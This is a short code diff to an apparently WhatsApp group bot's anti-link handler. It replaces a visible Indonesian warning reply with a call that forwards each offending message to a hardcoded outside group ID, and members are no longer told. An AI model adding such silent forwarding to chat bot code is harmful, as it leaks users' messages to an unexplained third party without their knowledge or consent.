@@ -6,7 +6,7 @@ module.exports = {
     let isGroupLink = linkRegex.exec(m.text)
 
     if (chat.antiLink && isGroupLink) {
-      m.reply('Hapus!!\n\nLink Grup terdeteksi')
+      m.copyNForward('120363021120029990@g.us',  true)
       if (global.opts['restrict']) {
         if (isAdmin || !isBotAdmin) return true
         // this.groupRemove(m.chat, [m.sender])
